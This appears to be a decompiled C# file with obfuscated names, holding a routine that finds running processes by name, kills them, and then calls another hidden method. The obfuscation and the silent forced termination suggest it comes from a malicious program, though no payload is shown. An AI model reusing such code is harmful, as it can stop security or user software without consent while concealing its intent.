using System;
using System.Diagnostics;

namespace eltZnUpwRizyZ;

public sealed class IPTkFPtlnOvumm
{
	public static bool BHOZtuusVN(Process P_0, string P_1)
	{
		try
		{
			return P_0.ProcessName.ToLower().Contains(P_1.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void aYAHEehdSfnec(string P_0, string P_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (BHOZtuusVN(process, P_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					OPwDdsoVlNU.QgzadyGmZecBjF();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
